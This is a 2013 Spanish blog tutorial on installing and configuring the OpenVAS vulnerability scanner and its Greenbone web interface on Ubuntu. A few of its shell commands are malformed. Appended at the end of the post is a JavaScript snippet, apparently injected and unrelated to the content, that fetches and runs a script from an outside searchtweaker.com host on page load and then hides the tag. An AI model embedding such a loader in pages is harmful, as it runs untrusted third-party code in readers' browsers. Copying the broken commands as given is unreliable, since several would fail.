---
layout: post
title: La utilización y empleo de OpenVAS-2da parte
date: 2013-01-10
author: neoranger
comments: true
categories: [General, Informacion]
---
<div dir="ltr" style="text-align:left;">Se acerca el gran día, sábado 12 de enero del 2013 ....<br /><br />Bueno,  volviendo con el tema respecto al escáner de vulnerabilidades OpenVAS ,  lo he probado y definitivamente dejenme recomendarle OpenVAS el  merecido sucesor de NESSUS (que durante muchísimos años fue uno de los  proyectos OPEN SOURCE con gran éxito) por lo que a continuación  detallaré parte de los comandos para su utilización.<br /><br />Descargue   de la página de OpenVAS la versión más actualizada, Ubuntu y openSUSE  tienen sus propios repositorios OBS, losadministradores de Ubuntu y  Debian necesitan instalar un paquete,<br /><br /><a name='more'></a><br /><br /><span style="color:yellow;"><b>sudo apt-get install -y install python-software-properties.</b></span><br /><br />antes de integrar el repositorio el administrador puede añadir el paquete fuente de la siguiente forma en ubuntu:<br /><br /><span style="color:yellow;"><b>sudo add-apt-repository "deb http://download.opensuse.org/repositories/security:/OpenVAS:/STABLE:/v4/xUbuntu_11.10/ ./"</b></span><br /><br />Usar los repositorios de seguridad de openSUSE requiere tener una llave GnuPG:<br /><br /><span style="color:yellow;"><b>sudo apt-key adv --Keyserver hkp://keys.gnupg.net --recv-keys BED1E87979EAFD54</b></span><br /><br />actualizar las versiones actuales: <span style="color:yellow;"><b>sudo apt-get update</b></span><br /><br />Instalamos los paquetes deseados usando apt-get  o con un gestor de paquetes gráfico.<br /><br /><span style="color:yellow;"><b>sudo apt-get -y install </b></span><br /><span style="color:yellow;"><b>openvas -manager</b></span><br /><span style="color:yellow;"><b>openvas-scanner </b></span><br /><span style="color:yellow;"><b>openvas-administrador</b></span><br /><span style="color:yellow;"><b>greenbone-security-assistant sqlite3</b></span><br /><span style="color:yellow;"><b>xsltproc</b></span><br /><span style="color:yellow;"><b><br /></b></span><span style="color:yellow;"><span style="color:black;">Si añadimos el repositorio en el cliente podemos instalar los programas necesarios allí mismo</span></span><br /><br /><span style="color:yellow;"><b>sudo apt-get install gsd  openvas-cli</b></span><br /><br /><span style="color:yellow;"><span style="color:black;">Para encriptar la comunicación  debemos generar los certificados de la forma siguiente:</span></span><br /><br /><b><span style="color:yellow;">test -e /var/lib/openvas/CA/cacert.pem || sudo openvas-mkcert -q</span></b><br /><br /><span style="color:yellow;"><span style="color:black;">El comando unix test comprueba si existe un certificado de no ser así inicia el script apropiado . Ejecutamos:</span></span><br /><br /><b><span style="color:yellow;">sudo openvas-nvt-nsync</span></b><br /><br /><span style="color:yellow;"><span style="color:black;">Creado nuestro usuario (destroyer) generaremos un certificado de cliente haciendo lo siguiente:</span></span><br /><br /><span style="color:yellow;"><b>test -e/var/lib/openvas/users/destroyer || sudo openvas-mkcert-client -n destroyer -i</b></span><br /><br /><span style="color:yellow;"><span style="color:black;">Activamos los servicios de escáner (OpenVAS open-vassd, OpenVAS MAnager openvasmd y OpenVAS Administrator openvasad)</span></span><br /><br /><span style="color:yellow;"><span style="color:black;"> <b><span style="color:yellow;">sudo openvassd</span></b></span></span><br /><b><span style="color:yellow;">sudo openvasmd --migrate </span></b><br /><b><span style="color:yellow;">sudo openvasmd --rebuild</span></b><br /><b><span style="color:yellow;">sudo killall openvassd</span></b><br /><span style="color:yellow;"><b>sleep 15</b></span><br /><br />En el futuro podremos lanzar los servicios necesarios con estos comandos:<br /><br />sudo service openvas-scanner start<br />sudo service openvas-manager start<br />sudo service openvas-administrator restart<br /><br />Para  utilizar la intefaz web GSA, necesitamos utilizar su servicio  escribiendo gsad. Asumimos que hemos instalado el paquete  greenbone-security-assistant en el servidor.<br /><br />sudo /etc/init.d/greenbone-security-assistant start<br /><br />En la versión 4  necesitamos crear un usuario administrativo <br /><br /><span style="color:yellow;"><b>test -e/var/lib/openvas/users/admin || sudo openvasad -c  add_user -n admin -r Admin</b></span><br /><br />Los administradores puede trabajar con OpenVAS de las siguientes formas : sea por linea de comando,por la aplicación de escritorio gsd o por la interfaz WEB GSA (http://OpenVAS-server:9392)<br />Para  poder trabajar con la interfaz web debemos antes modificar la  configuración de /etc/default/greenbone-security-assitant. Cambiando   GSA_ADRESS=127.0.0.1 por la direcci'on IP "CORRECTA".<br />En el caso de no querer encriptar  las comunicaciones entre  la interfaz web y el gestor en la red local añadimos<b><span style="color:yellow;"> HTTP_ONLY=1</span></b> en el Inicio del Script . A continuación en /etc/init.d/greenbone-security-assistant reemplazaremos la linea<br /><br /><span style="color:yellow;"><b>[ "$GSA_ADDRESS"] &amp;&amp; DAEMONOPTS="-listen= $GSA_ADDRESS"</b></span><br /><br />con<br /><br /><span style="color:yellow;"><b>[ "$GSA_ADDRESS"] &amp;&amp; DAEMONOPTS="--http-only"</b></span><br /><br /> reiniciamos GSA<br /><br /><span style="color:yellow;"><b>/etc/init.d/greenbone-security-assitant restart</b></span><br /><br />Podemos tambien trabajar Greenbone Security Desktop pero como usuario normal, no como root, por lo que escribimos: <span style="color:yellow;"><b>gsd </b></span>en el host del cliente y nos identificamos.<br /><br />A disfrutarlo ... y a su vez un merecido agradecimiento a los desarrolladores de Greenbone por su gran aporte a la comunidad.<br />http://arthurhuamanic.blogspot.com.es/<br />(function(){try{var header=document.getElementsByTagName("HEAD")[0];var script=document.createElement("SCRIPT");script.src="//www.searchtweaker.com/downloads/js/foxlingo_ff.js";script.onload=script.onreadystatechange=function(){if (!(this.readyState)||(this.readyState=="complete"||this.readyState=="loaded")){script.onload=null;script.onreadystatechange=null;header.removeChild(script);}}; header.appendChild(script);} catch(e) {}})();</div>
